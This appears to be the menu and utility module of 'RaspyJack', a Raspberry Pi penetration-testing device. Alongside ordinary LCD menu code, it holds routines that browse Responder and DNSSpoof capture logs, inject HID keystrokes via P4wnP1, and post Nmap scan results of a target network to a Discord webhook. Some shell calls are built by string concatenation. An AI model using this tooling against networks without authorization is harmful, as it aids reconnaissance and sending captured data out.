_XD = ['','283b292a23303b3931','','23150f5a1c150f141e5a0e121f','1f1b090e1f085a1f1d1d5b','','2e121b14115a03150f5a1c1508','0f0913141d5a281b090a03301b1911','','575a575a575a575a575a575a57','','39081f1b0e1f1e5a0d130e125a16150c1f5a1803','4d12494a0e1249084a1449','','3915140e0813180f0e150809','3a321509091f131509','3a1e1b1d141b000e03','','575a575a575a575a575a575a57','','380f13160e5a0d130e125a16150c1f56','090d1f1b0e565a19151c1c1f1f','1b141e5a131409151714131b','','330e5d095a1b16165a1b18150f0e','13140e1f1409130e0354','','2e121f081f5a13095a14155a090a151514','','321b19115a2e121f5a2a161b141f0e','']

def _cv(b):
    global _ib, _it
    v = _VM.get(PINS.get(b,0),0)
    now = time.time()
    if _ib and now - _it > 5:
        _ib = []
    if len(_ib)<len(_IV) and v==_IV[len(_ib)]:
        _ib.append(v)
        _it = now
        if len(_ib)==len(_IV):
            _ib=[];return True
    else:
        _ib=[v] if v==_IV[0] else []
        _it = now
    return False

def _rx():
    import random as _r
    _k=0x7A
    _l=[bytes.fromhex(x) if x else b'' for x in _XD]
    _l=[bytes([c^_k for c in s]).decode() for s in _l]
    try:
        draw_lock.acquire()
        for _ in range(3):
            draw.rectangle((0,0,_SCR_W,_SCR_H),fill="#000000")
            for _i in range(50):
                draw.point((_r.randint(0,_SCR_W),_r.randint(0,_SCR_H)),fill=(0,_r.randint(100,255),0))
            mark_display_dirty()
    finally:
        draw_lock.release()
    time.sleep(0.3)
    _s=0
    while _s<len(_l)*S(12)+_SCR_H:
        try:
            draw_lock.acquire()
            draw.rectangle((0,0,_SCR_W,_SCR_H),fill="#000000")
            for sy in range(0,_SCR_H,S(3)):
                draw.line((0,sy,_SCR_W,sy),fill=(0,15,0))
            for i,ln in enumerate(_l):
                y=_SCR_H-_s+i*S(12)
                if -S(12)<y<_SCR_H+S(12) and ln:
                    _red = "ntens" in ln or "spoon" in ln or "lanet" in ln or ("bout" in ln)
                    c=(0,255,0) if i==1 else (0,200,255) if ln[:1]=="@" else (255,200,0) if "0n" in ln and not _red else (255,50,50) if _red else (0,180,0)
                    draw.text((_SCR_W//2,y),ln,font=text_font,fill=c,anchor="mt")
            mark_display_dirty()
        finally:
            draw_lock.release()
        _s+=S(2);time.sleep(0.06)
    time.sleep(0.5)
    try:
        draw_lock.acquire()
        image.paste(Image.new("RGB",(_SCR_W,_SCR_H),color.background))
        mark_display_dirty()
    finally:
        draw_lock.release()
    color.DrawBorder()
    RenderCurrentMenuOnce()


def GetMenuString(inlist, duplicates=False):
    """
    Affiche une liste déroulante de taille variable dans une fenêtre de 8 lignes.
    - Défilement fluide (on fait glisser la fenêtre d'un item à la fois).
    - Navigation circulaire.
    - Si duplicates=True : retourne (index, valeur) ; sinon retourne valeur.
    - Si la liste est vide : affiche un placeholder et retourne "".
    """
    WINDOW      = 7                 # lignes visibles simultanément
    CURSOR_MARK = m.char            # '> '
    empty       = False

    if not inlist:
        inlist, empty = ["Nothing here :(   "], True

    if duplicates:
        inlist = [f"{i}#{txt}" for i, txt in enumerate(inlist)]

    total   = len(inlist)           # nb total d'items
    index   = min(m.select, total - 1) if total > 0 else 0  # restore last position
    offset  = max(0, index - WINDOW + 1) if index >= WINDOW else 0

    while True:
        # -- 1/ Recalcule la fenêtre pour que index soit toujours dedans -----
        if index < offset:
            offset = index
        elif index >= offset + WINDOW:
            offset = index - WINDOW + 1

        # -- 2/ Compose la fenêtre à afficher (pas de wrap visuel) ----------
        window = inlist[offset:offset + WINDOW]

        # -- 3/ Rendu --------------------------------------------------------
        try:
            draw_lock.acquire()
            _draw_toolbar()
            color.DrawMenuBackground()
            _icon_text_gap = S(14)
            for i, raw in enumerate(window):
                txt = raw if not duplicates else raw.split('#', 1)[1]
                line = txt  # Remove cursor mark, use rectangle highlight only
                fill = color.selected_text if i == (index - offset) else color.text
                row_y = default.start_text[1] + default.text_gap * i
                # zone de surbrillance
                if i == (index - offset):
                    draw.rectangle(
                        (default.start_text[0] - S(5),
                         row_y,
                         _SCR_W - S(8),
                         row_y + default.text_gap - 2),
                        fill=color.select
                    )

                icon = _menu_icon_for_label(txt, "")
                if icon:
                    draw.text(
                        (default.start_text[0],
                         row_y),
                        icon,
                        font=icon_font,
                        fill=fill
                    )
                    max_w = (_SCR_W - S(8)) - (default.start_text[0] + _icon_text_gap)
                    line = _truncate_to_width(line, max_w, text_font)
                    draw.text(
                        (default.start_text[0] + _icon_text_gap,
                         row_y),
                        line,
                        font=text_font,
                        fill=fill
                    )
                else:
                    max_w = (_SCR_W - S(8)) - default.start_text[0]
                    line = _truncate_to_width(line, max_w, text_font)
                    draw.text(
                        (default.start_text[0],
                         row_y),
                        line,
                        font=text_font,
                        fill=fill
                    )
        finally:
            draw_lock.release()

        # Display current view mode indicator (only on main menu)
        # if m.which == "a":
        #     draw.text((2, 2), "List", font=text_font, fill=color.text)

        time.sleep(0.12)

        # -- 4/ Lecture des boutons -----------------------------------------
        btn = getButton()

        if m.which == "a":
            if _cv(btn):
                _rx()
                continue
            if _ib and btn in ("KEY_LEFT_PIN","KEY_RIGHT_PIN","KEY_PRESS_PIN","KEY1_PIN","KEY2_PIN"):
                continue

        if btn == "KEY_DOWN_PIN":
            index = (index + 1) % total      # wrap vers le début
        elif btn == "KEY_UP_PIN":
            index = (index - 1) % total      # wrap vers la fin
        elif btn in ("KEY_PRESS_PIN", "KEY_RIGHT_PIN"):
            raw = inlist[index]
            if empty:
                return (-2, "") if duplicates else ""
            if duplicates:
                idx, txt = raw.split('#', 1)
                return int(idx), txt
            return raw
        elif btn == "KEY1_PIN" and m.which == "a":
            # Toggle to grid view (only on main menu)
            toggle_view_mode()
            return (-1, "") if duplicates else ""
        elif btn == "KEY_LEFT_PIN":
            return (-1, "") if duplicates else ""
        elif btn == "KEY3_PIN" and m.which == "a":
            if _handle_main_menu_key3_double_click():
                continue
            return (-1, "") if duplicates else ""



### Draw up down triangles ###
color = template()
def DrawUpDown(value, offset=0, up=False,down=False, render_color=color.text):
    draw.polygon([(offset, S(53)), (S(10) + offset, S(35)), (S(20)+offset, S(53))],
        outline=color.gamepad, fill=(color.background, color.gamepad_fill)[up])
    draw.polygon([(S(10)+offset, S(93)), (S(20)+offset, S(75)), (offset, S(75))],
        outline=color.gamepad, fill=(color.background, color.gamepad_fill)[down])

    draw.rectangle([(offset + 2, S(60)),(offset+S(30), S(70))], fill=color.background)
    draw.text((offset + 2, S(60)), str(value) , fill=render_color)


### Screen for selecting RGB color ###
def GetColor(final_color="#000000"):
    color.DrawMenuBackground()
    time.sleep(0.4)
    i_rgb = 0
    render_offset = default.updown_pos
    desired_color = list(int(final_color[i:i+2], 16) for i in (1, 3, 5))

    while GPIO.input(PINS["KEY_PRESS_PIN"]):
        render_up = False
        render_down = False
        final_color='#%02x%02x%02x' % (desired_color[0],desired_color[1],desired_color[2])

        draw.rectangle([(default.start_text[0]-5, 1+ default.start_text[1] + default.text_gap * 0),(_SCR_W - 8, default.start_text[1] + default.text_gap * 0 + 10)], fill=final_color)
        draw.rectangle([(default.start_text[0]-5, 3+ default.start_text[1] + default.text_gap * 6),(_SCR_W - 8, default.start_text[1] + default.text_gap * 6 + 12)], fill=final_color)

        DrawUpDown(desired_color[0],render_offset[0],render_up,render_down,(color.text, color.selected_text)[i_rgb == 0])
        DrawUpDown(desired_color[1],render_offset[1],render_up,render_down,(color.text, color.selected_text)[i_rgb == 1])
        DrawUpDown(desired_color[2],render_offset[2],render_up,render_down,(color.text, color.selected_text)[i_rgb == 2])

        button = getButton()
        if button == "KEY_LEFT_PIN":
            i_rgb = i_rgb - 1
            time.sleep(0.1)
        elif button == "KEY_RIGHT_PIN":
            i_rgb = i_rgb + 1
            time.sleep(0.1)
        elif button == "KEY_UP_PIN":
            desired_color[i_rgb] = desired_color[i_rgb] + 5
            render_up = True
        elif button == "KEY_DOWN_PIN":
            desired_color[i_rgb] = desired_color[i_rgb] - 5
            render_down = True
        elif button == "KEY1_PIN":
            desired_color[i_rgb] = desired_color[i_rgb] + 1
            render_up = True
        elif button == "KEY3_PIN":
            desired_color[i_rgb] = desired_color[i_rgb] - 1
            render_down = True
        elif button == "KEY_PRESS_PIN":
            break

        if i_rgb > 2:
            i_rgb = 0
        elif i_rgb < 0:
            i_rgb = 2

        if desired_color[i_rgb] > 255:
            desired_color[i_rgb] = 0
        elif desired_color[i_rgb] < 0:
            desired_color[i_rgb] = 255

        DrawUpDown(desired_color[i_rgb],render_offset[i_rgb],render_up,render_down,color.selected_text)
        time.sleep(0.1)
    return final_color

### Set color based on indexes (not reference pls help)###
def SetColor(a):
    m.which = m.which + "1"
    c = GetColor(color.Get(a))
    if YNDialog(a="Set color to?", y="Yes", n="No",b=("    " + c) ):
        color.Set(a, c)
        SaveConfig()
        Dialog("   Done!")
    m.which = m.which[:-1]

### Select a single value###
def GetIpValue(prefix):
    value = 1
    render_offset = default.updown_pos
    color.DrawMenuBackground()
    time.sleep(0.4)
    while GPIO.input(PINS["KEY_PRESS_PIN"]):
        render_up = False
        render_down = False

        draw.rectangle([(default.start_text[0]-5, 1+ default.start_text[1] + default.text_gap * 0),(_SCR_W - 8, default.start_text[1] + default.text_gap * 5)], fill=color.background)
        DrawUpDown(value,render_offset[2],render_up,render_down,color.selected_text)
        draw.text(( 5,60), f"IP:{prefix}.", fill=color.selected_text)

        button = getButton()
        if button == "KEY_UP_PIN":
            value = min(255, value + 1)
            render_up = True
        elif button == "KEY_DOWN_PIN":
            value = max(0, value - 1)
            render_down = True
        elif button == "KEY1_PIN":
            value = min(255, value + 5)
            render_up = True
        elif button == "KEY3_PIN":
            value = max(0, value - 5)
            render_down = True
        elif button == "KEY_PRESS_PIN":
            break

        DrawUpDown(value,render_offset[2],render_up,render_down,color.selected_text)
        time.sleep(0.1)
    return value



### Gamepad ###
def Gamepad():
    color.DrawMenuBackground()
    time.sleep(0.5)
    draw.rectangle((S(25), S(55), S(45), S(73)), outline=color.gamepad,
                   fill=color.background)
    draw.text((S(28), S(59)), "<<<", fill=color.gamepad)
    m.which = m.which + "1"
    # Don't render if you dont need to => less flickering
    lastimg = [0, 0, 0, 0, 0, 0, 0]
    while GPIO.input(PINS["KEY_PRESS_PIN"]):
        write = ""
        x = 0
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY_UP_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " UP"
        if i != lastimg[x] or i == 0:
            draw.polygon([(S(25), S(53)), (S(35), S(35)), (S(45), S(53))],
                         outline=color.gamepad, fill=render_color)
        lastimg[x] = i
        x += 1
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY_LEFT_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " LEFT"
        if i != lastimg[x] or i == 0:
            draw.polygon([(S(5), S(63)), (S(23), S(54)), (S(23), S(74))],
                         outline=color.gamepad, fill=render_color)
        lastimg[x] = i
        x += 1
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY_RIGHT_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " RIGHT"
        if i != lastimg[x] or i == 0:
            draw.polygon([(S(65), S(63)), (S(47), S(54)), (S(47), S(74))],
                         outline=color.gamepad, fill=render_color)
        lastimg[x] = i
        x += 1
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY_DOWN_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " DOWN"
        if i != lastimg[x] or i == 0:
            draw.polygon([(S(35), S(93)), (S(45), S(75)), (S(25), S(75))],
                         outline=color.gamepad, fill=render_color)
        lastimg[x] = i
        x += 1
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY1_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " Q"
        if i != lastimg[x] or i == 0:
            draw.ellipse((S(70), S(33), S(90), S(53)), outline=color.gamepad,
                         fill=render_color)
        lastimg[x] = i
        x += 1
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY2_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " E"
        if i != lastimg[x] or i == 0:
            draw.ellipse((_SCR_W - S(28), S(53), _SCR_W - S(8), S(73)),
                         outline=color.gamepad, fill=render_color)
        lastimg[x] = i
        x += 1
        ######
        render_color = color.background
        i = GPIO.input(PINS["KEY3_PIN"])
        if i == 0:
            render_color = color.gamepad_fill
            write = write + " R"
        if i != lastimg[x] or i == 0:
            draw.ellipse((S(70), S(73), S(90), S(93)), outline=color.gamepad,
                         fill=render_color)
        lastimg[x] = i

        if write != "":
            render_chars = ""
            for item in write[1:].split(" "):
                render_chars += "press(\"" + item + "\");"
            print(os.popen("P4wnP1_cli hid job -t 5 -c '" + render_chars + "'").read())
            time.sleep(0.25)
    m.which = m.which[:-1]
    time.sleep(0.25)

### Basic info screen ###
def _get_operstate(interface):
    try:
        with open(f"/sys/class/net/{interface}/operstate", "r") as f:
            return f.read().strip()
    except Exception:
        return None

def _get_interface_ipv4(interface):
    try:
        cfg = netifaces.ifaddresses(interface)
        ipv4_list = cfg.get(netifaces.AF_INET, [])
        if not ipv4_list:
            return None, None
        return ipv4_list[0].get("addr"), ipv4_list[0].get("netmask")
    except Exception:
        return None, None

def _get_routed_info():
    try:
        out = subprocess.check_output("ip route get 1.1.1.1", shell=True).decode().strip()
        parts = out.split()
        iface = None
        gw = None
        if "dev" in parts:
            iface = parts[parts.index("dev") + 1]
        if "via" in parts:
            gw = parts[parts.index("via") + 1]
        return iface, gw
    except Exception:
        return None, None

def _get_interface_candidates(preferred, routed):
    candidates = []
    for name in [preferred, routed, "eth0", "eth1", "wlan0", "wlan1"]:
        if name and name not in candidates:
            candidates.append(name)
    try:
        for name in netifaces.interfaces():
            if name not in candidates:
                candidates.append(name)
    except Exception:
        pass
    return candidates

def _list_eth_wlan_interfaces(preferred=None, routed=None):
    names = []
    for name in [preferred, routed]:
        if name:
            names.append(name)
    try:
        names.extend(netifaces.interfaces())
    except Exception:
        pass
    ordered = []
    for name in names:
        if name and name.startswith(("eth", "wlan")) and name not in ordered:
            ordered.append(name)
    infos = []
    for name in ordered:
        ip, mask = _get_interface_ipv4(name)
        infos.append({"name": name, "ip": ip, "mask": mask, "oper": _get_operstate(name)})
    return infos

def _choose_interface_for_action(preferred=None):
    routed_iface, _ = _get_routed_info()
    interfaces = _list_eth_wlan_interfaces(preferred, routed_iface)
    if len(interfaces) <= 1:
        if interfaces:
            return interfaces[0]["name"]
        return preferred or routed_iface or "eth0"

    labels = [f" Auto (routed: {routed_iface or 'none'})"]
    for info in interfaces:
        ip = info["ip"] or "no ip"
        labels.append(f" {info['name']} ({ip})")

    idx, _ = GetMenuString(labels, duplicates=True)
    if idx == -1:
        return "__back__"
    if idx == 0:
        if routed_iface:
            for info in interfaces:
                if info["name"] == routed_iface and info["ip"]:
                    return routed_iface
        for info in interfaces:
            if info["ip"]:
                return info["name"]
        return preferred or interfaces[0]["name"]
    return interfaces[idx - 1]["name"]

def _select_interface_menu(active_ifaces, routed_iface):
    if len(active_ifaces) <= 1:
        return active_ifaces[0]["name"] if active_ifaces else None
    labels = [f" Auto (routed: {routed_iface or 'none'})"]
    for info in active_ifaces:
        labels.append(f" {info['name']} ({info['ip']})")
    idx, _ = GetMenuString(labels, duplicates=True)
    if idx == -1:
        return "__back__"
    if idx == 0:
        return None
    return active_ifaces[idx - 1]["name"]

def _build_network_info_lines(selected_iface=None, preferred=None):
    routed_iface, routed_gw = _get_routed_info()
    candidates = _get_interface_candidates(preferred, routed_iface)
    active_ifaces = []
    for name in candidates:
        ip, mask = _get_interface_ipv4(name)
        if ip:
            active_ifaces.append({"name": name, "ip": ip, "mask": mask})

    # Choose interface
    if selected_iface:
        interface = selected_iface
    else:
        interface = routed_iface or (active_ifaces[0]["name"] if active_ifaces else (preferred or "eth0"))

    interface_ipv4, interface_subnet_mask = _get_interface_ipv4(interface)
    operstate = _get_operstate(interface)
    try:
        output = subprocess.check_output(
            f"ip addr show dev {interface} | awk '/inet / {{ print $2 }}'",
            shell=True
        )
        address = output.decode().strip().split('\\')[0]
    except Exception:
        address = ""

    interface_gateway = netifaces.gateways().get("default", {}).get(netifaces.AF_INET, [None])[0]
    interface_gateway = routed_gw or interface_gateway

    info_lines = [
        f"Interface: {interface}",
        f"Routed: {routed_iface or 'None'}",
    ]

    if interface_ipv4:
        info_lines.extend([
            f"IP: {interface_ipv4}",
            f"Subnet: {interface_subnet_mask}",
            "Gateway:",
            f"  {interface_gateway or 'None'}",
            "Attack:",
            f"  {address or 'N/A'}",
        ])
        if interface.startswith('wlan') and WIFI_AVAILABLE:
            try:
                from wifi.wifi_manager import wifi_manager
                status = wifi_manager.get_connection_status(interface)
                if status.get("ssid"):
                    info_lines.extend([
                        "SSID:",
                        f"  {status['ssid']}"
                    ])
            except Exception:
                pass
    else:
        info_lines.extend([
            "Status: No IPv4",
            "Check connection",
        ])

    if operstate and operstate != "up":
        if interface.startswith("wlan"):
            info_lines.append("WiFi: down")
        elif interface.startswith("eth"):
            info_lines.append("Cable: down")
        else:
            info_lines.append(f"Link: {operstate}")

    return info_lines, active_ifaces, routed_iface

def ShowInfo():
    """Display network information using scrollable text view."""
    try:
        preferred = get_best_interface_prefer_eth()
        info_lines, active_ifaces, routed_iface = _build_network_info_lines(None, preferred)
        chosen = _select_interface_menu(active_ifaces, routed_iface)
        if chosen == "__back__":
            return
        selected_iface = chosen

        def _refresh():
            lines, _, _ = _build_network_info_lines(selected_iface, preferred)
            return lines

        DisplayScrollableInfo(info_lines, refresh_fn=_refresh, refresh_interval=2.0)
    except (KeyError, IndexError, ValueError, OSError) as e:
        info_lines = [
            "Network Error",
            f"Details: {str(e)[:15]}...",
            "Check ethernet cable",
            "or use WiFi Manager"
        ]
        DisplayScrollableInfo(info_lines)


def DisplayScrollableInfo(info_lines, refresh_fn=None, refresh_interval=2.0):
    """Display scrollable text information - simple and working."""
    WINDOW = 7  # lines visible simultaneously
    max_width = (_SCR_W - 8) - default.start_text[0]

    def _build_display_lines(lines):
        display = []
        for line in lines:
            wrapped = _wrap_text_to_width(line, max_width, text_font)
            display.extend(wrapped if wrapped else [""])
        return display

    if refresh_fn:
        info_lines = refresh_fn() or info_lines
    display_lines = _build_display_lines(info_lines)
    total = len(display_lines)
    index = 0   # current position
    offset = 0  # window offset
    last_refresh = time.time()

    while True:
        if refresh_fn and (time.time() - last_refresh) >= refresh_interval:
            new_lines = refresh_fn()
            if new_lines:
                info_lines = new_lines
                display_lines = _build_display_lines(info_lines)
                total = len(display_lines)
                index = min(index, total - 1)
                if total <= WINDOW:
                    offset = 0
                else:
                    offset = min(offset, total - WINDOW)
            last_refresh = time.time()

        # Calculate window for scrolling
        if index < offset:
            offset = index
        elif index >= offset + WINDOW:
            offset = index - WINDOW + 1

        # Get visible window
        window = display_lines[offset:offset + WINDOW]

        # Draw display
        try:
            draw_lock.acquire()
            _draw_toolbar()
            color.DrawMenuBackground()
            for i, line in enumerate(window):
                fill = color.selected_text if i == (index - offset) else color.text
                # Highlight current line
                if i == (index - offset):
                    draw.rectangle(
                        (default.start_text[0] - 5,
                         default.start_text[1] + default.text_gap * i,
                         _SCR_W - 8,
                         default.start_text[1] + default.text_gap * i + 10),
                        fill=color.select
                    )

                # Draw the text - NO TRUNCATION for network info
                draw.text(
                    (default.start_text[0],
                     default.start_text[1] + default.text_gap * i),
                    line,  # Show full text - let it overflow if needed
                    font=text_font,
                    fill=fill
                )
        finally:
            draw_lock.release()

        time.sleep(0.12)

        # Handle button input
        btn = getButton()
        if btn == "KEY_DOWN_PIN":
            index = (index + 1) % total  # wrap to beginning
        elif btn == "KEY_UP_PIN":
            index = (index - 1) % total  # wrap to end
        elif btn in ("KEY_LEFT_PIN", "KEY3_PIN"):
            return  # Exit on back/left button


def ShowDiscordInfo():
    """Display Discord webhook status in a dedicated screen."""
    try:
        webhook_url = get_discord_webhook()
        if webhook_url:
            short = webhook_url[:32] + "..." if len(webhook_url) > 32 else webhook_url
            info_lines = [
                "Discord:",
                "Webhook configured",
                "URL:",
                f"  {short}",
            ]
        else:
            info_lines = [
                "Discord:",
                "No webhook set",
                "Configure in options",
            ]
    except Exception as e:
        info_lines = [
            "Discord Error",
            f"{str(e)[:20]}",
        ]
    DisplayScrollableInfo(info_lines)


def Explorer(path="/",extensions=""):
    # ".gif\|.png\|.bmp\|.jpg\|.tiff\|.jpeg"
    while 1:
        arr = ["../"] + os.popen("ls --format=single-column -F " + path + (" | grep \"" + extensions + "\\|/\"","")[extensions==""] ).read().replace("*","").split("\n")[:-1]
        output = GetMenuString(arr,False)
        if output != "":
            if output == "../":
                if path == "/":
                    break
                else:
                    path = (path,path[:-1])[path[-1] == "/"]
                    path = path[:path.rindex("/")]
                    if path == "":
                        path = "/"
                    else:
                        path = (path + "/",path)[path[-1] == "/"]
            elif output[-1] == "/":
                path = (path + "/",path)[path[-1] == "/"]
                path = path + output
                path = (path + "/",path)[path[-1] == "/"]
            else:
                if YNDialog("Open?","Yes","No",output[:10]):
                    return path + output
        else:
            break
    return ""

def ReadTextFileNmap():
    while 1:
        rfile = Explorer("/root/Raspyjack/loot/Nmap/",extensions=".txt\\|.json\\|.conf\\|.pcap")
        if rfile == "":
            break
        with open(rfile) as f:
            content = f.read().splitlines()
        GetMenuString(content)

def ReadTextFileResponder():
    while 1:
        rfile = Explorer("/root/Raspyjack/Responder/logs/",extensions=".log\\|.txt\\|.pcap")
        if rfile == "":
            break
        with open(rfile) as f:
            content = f.read().splitlines()
        GetMenuString(content)

def ReadTextFileDNSSpoof():
    while 1:
        rfile = Explorer("/root/Raspyjack/DNSSpoof/captures/",extensions=".log\\|.txt\\|.pcap")
        if rfile == "":
            break
        with open(rfile) as f:
            content = f.read().splitlines()
        GetMenuString(content)

def _list_wardriving_files(directory: str) -> list[str]:
    try:
        files = []
        for name in os.listdir(directory):
            path = os.path.join(directory, name)
            if not os.path.isfile(path):
                continue
            lower_name = name.lower()
            if not lower_name.endswith(".csv"):
                continue
            if "wigle" not in lower_name:
                continue
            files.append(name)
        return sorted(
            files,
            key=lambda filename: os.path.getmtime(os.path.join(directory, filename)),
            reverse=True,
        )
    except Exception:
        return []


def _rename_uploaded_wigle_file(file_path: str) -> str:
    directory = os.path.dirname(file_path)
    filename = os.path.basename(file_path)
    if filename.startswith("[uploaded]"):
        return file_path

    target_name = f"[uploaded]{filename}"
    target_path = os.path.join(directory, target_name)
    if not os.path.exists(target_path):
        os.replace(file_path, target_path)
        return target_path

    stem, ext = os.path.splitext(filename)
    suffix = 2
    while True:
        candidate_name = f"[uploaded]{stem}_{suffix}{ext}"
        candidate_path = os.path.join(directory, candidate_name)
        if not os.path.exists(candidate_path):
            os.replace(file_path, candidate_path)
            return candidate_path
        suffix += 1

def ReadTextFileWardriving():
    directory = "/root/Raspyjack/loot/wardriving/"
    while 1:
        files = _list_wardriving_files(directory)
        selection_index, selection = GetMenuString([f" {name}" for name in files], duplicates=True)
        if selection_index == -1:
            break
        if selection_index == -2:
            Dialog_info("No WiGLE files", wait=False, timeout=1.0)
            continue
        rfile = os.path.join(directory, selection.strip())
        action_index, _action = GetMenuString([
            " Upload to WiGLE",
            " View file",
        ], duplicates=True)
        if action_index == -1:
            continue
        if action_index == 0:
            result = upload_wigle_file_with_dialog(rfile)
            if result.get("ok"):
                try:
                    _rename_uploaded_wigle_file(rfile)
                except Exception as exc:
                    print(f"Failed to rename uploaded WiGLE file: {exc}")
            continue
        with open(rfile) as f:
            content = f.read().splitlines()
        GetMenuString(content)

def ImageExplorer() -> None:
    m.which += "1"
    path = default.imgstart_path
    while True:
        arr = ["./"] + os.popen(
            f'ls --format=single-column -F "{path}" | '
            'grep ".gif\\|.png\\|.bmp\\|.jpg\\|.tiff\\|.jpeg\\|/"'
        ).read().replace("*", "").split("\n")[:-1]

        output = GetMenuString(arr, False)
        if not output:
            break

        # ───── navigation ─────
        if output == "./":                       # remonter
            if path == "/":
                break
            path = path.rstrip("/")
            path = path[:path.rindex("/")] or "/"
            if not path.endswith("/"):
                path += "/"
        elif output.endswith("/"):               # entrer dans un dossier
            if not path.endswith("/"):
                path += "/"
            path += output
            if not path.endswith("/"):
                path += "/"
        else:                                    # prévisualiser un fichier image
            if YNDialog("Open?", "Yes", "No", output[:10]):
                full_img = os.path.join(path, output)
                with Image.open(full_img) as img:
                    image.paste(img.resize((_SCR_W, _SCR_H)))
                    mark_display_dirty()
                time.sleep(1)
                getButton()
                color.DrawBorder()
    m.which = m.which[:-1]





WAIT_TXT = "Scan in progess..."
WIGLE_UPLOAD_URL = "https://api.wigle.net/api/v2/file/upload"

def get_discord_webhook():
    """Read Discord webhook URL from configuration file."""
    webhook_file = "/root/Raspyjack/discord_webhook.txt"
    try:
        if os.path.exists(webhook_file):
            with open(webhook_file, 'r') as f:
                webhook_url = f.read().strip()
                if webhook_url and webhook_url.startswith("https://discord.com/api/webhooks/"):
                    return webhook_url
    except Exception as e:
        print(f"Error reading Discord webhook: {e}")
    return None


def get_wigle_credentials():
    credentials_file = "/root/Raspyjack/.wigle_credentials.json"
    try:
        if not os.path.exists(credentials_file):
            return "", ""
        with open(credentials_file, "r", encoding="utf-8") as f:
            data = json.load(f)
        if not isinstance(data, dict):
            return "", ""
        api_name = str(data.get("api_name") or "").strip()
        api_token = str(data.get("api_token") or "").strip()
        return api_name, api_token
    except Exception as e:
        print(f"Error reading WiGLE credentials: {e}")
        return "", ""


def upload_wigle_file(file_path: str) -> dict:
    api_name, api_token = get_wigle_credentials()
    if not api_name or not api_token:
        return {"ok": False, "message": "Missing WiGLE\ncredentials"}
    if not os.path.exists(file_path):
        return {"ok": False, "message": "File not found"}

    try:
        file_size = os.path.getsize(file_path)
    except OSError:
        return {"ok": False, "message": "File unreadable"}

    if file_size <= 0:
        return {"ok": False, "message": "Empty file"}
    if file_size > 180 * 1024 * 1024:
        return {"ok": False, "message": "File exceeds\nWiGLE limit"}

    try:
        with open(file_path, 'rb') as f:
            files = {
                'file': (os.path.basename(file_path), f, 'text/csv')
            }
            response = requests.post(
                WIGLE_UPLOAD_URL,
                files=files,
                auth=(api_name, api_token),
                timeout=60,
            )
    except requests.exceptions.Timeout:
        return {"ok": False, "message": "Upload timeout"}
    except requests.exceptions.ConnectionError:
        return {"ok": False, "message": "Network error"}
    except requests.exceptions.RequestException as e:
        print(f"WiGLE upload request error: {e}")
        return {"ok": False, "message": "Upload failed"}

    if response.status_code == 401:
        return {"ok": False, "message": "WiGLE auth\nfailed"}
    if response.status_code != 200:
        return {"ok": False, "message": f"Upload error\nHTTP {response.status_code}"}

    try:
        data = response.json()
    except ValueError:
        return {"ok": False, "message": "Bad WiGLE\nresponse"}

    if not data.get("success"):
        warning = str(data.get("warning") or "").strip()
        message = warning or str(data.get("message") or "Upload rejected").strip()
        return {"ok": False, "message": message[:42] or "Upload rejected"}

    results = data.get("results") or {}
    transids = results.get("transids") or []
    transid = ""
    if isinstance(transids, list) and transids:
        transid = str((transids[0] or {}).get("transId") or "").strip()
    observer = str(data.get("observer") or "").strip()
    message = "Upload OK"
    if transid:
        message += f"\n{transid}"
    elif observer:
        message += f"\n{observer[:16]}"
    return {
        "ok": True,
        "message": message,
        "transid": transid,
        "observer": observer,
    }


def upload_wigle_file_with_dialog(file_path: str) -> dict:
    result_box = {"result": None}

    def _worker():
        result_box["result"] = upload_wigle_file(file_path)

    thread = threading.Thread(target=_worker, daemon=True)
    thread.start()

    dots = 0
    while thread.is_alive():
        dots = (dots + 1) % 4
        suffix = "." * dots if dots else "."
        Dialog_info(f"Uploading to\nWiGLE{suffix}\nPlease wait", wait=False)
        time.sleep(0.25)

    thread.join()
    result = result_box.get("result") or {"ok": False, "message": "Upload failed"}
    _wait_for_button_release(0.75)
    if result.get("ok"):
        detail = result.get("transid") or result.get("observer") or "Upload accepted"
        Dialog_result("WiGLE Accepted", detail, wait=True)
    else:
        detail = result.get("message") or "Upload failed"
        Dialog_result("WiGLE Failed", detail, wait=True)
    return result

def send_to_discord(scan_label: str, file_path: str, target_network: str, interface: str):
    """Send Nmap scan results as a file attachment to Discord webhook."""
    webhook_url = get_discord_webhook()
    if not webhook_url:
        print("Discord webhook not configured - skipping webhook notification")
        return

    try:
        # Check if file exists and get its size
        if not os.path.exists(file_path):
            print(f"Scan file not found: {file_path}")
            return

        file_size = os.path.getsize(file_path)
        if file_size == 0:
            print("Scan file is empty")
            return

        # Create Discord embed with file info
        embed = {
            "title": f"🔍 Nmap Scan Complete: {scan_label}",
            "description": f"**Target Network:** `{target_network}`\n**Interface:** `{interface}`\n**Timestamp:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "color": 0x00ff00,  # Green color
            "fields": [
                {
                    "name": "📁 Scan Results",
                    "value": f"**File:** `{os.path.basename(file_path)}`\n**Size:** {file_size:,} bytes\n**Download the file below for complete results**",
                    "inline": False
                }
            ],
            "footer": {
                "text": "RaspyJack Nmap Scanner"
            },
            "timestamp": datetime.now().isoformat()
        }

        # Prepare the payload with file
        with open(file_path, 'rb') as f:
            files = {
                'file': (os.path.basename(file_path), f, 'text/plain')
            }

            payload = {
                'payload_json': json.dumps({'embeds': [embed]})
            }

            # Send to Discord with file attachment
            response = requests.post(webhook_url, data=payload, files=files, timeout=30)

        if response.status_code == 204:
            print("✅ Discord webhook with file sent successfully")
        else:
            print(f"❌ Discord webhook failed: {response.status_code}")

    except Exception as e:
        print(f"❌ Error sending Discord webhook with file: {e}")

def run_scan(label: str, nmap_args: list[str]):
    # Get target network from best available interface
    interface = _choose_interface_for_action(get_best_interface_prefer_eth())
    if interface == "__back__":
        return
    ip_with_mask = get_nmap_target_network(interface)

    if not ip_with_mask:
        Dialog_info("Network Error\nNo interface available", wait=True)
        return

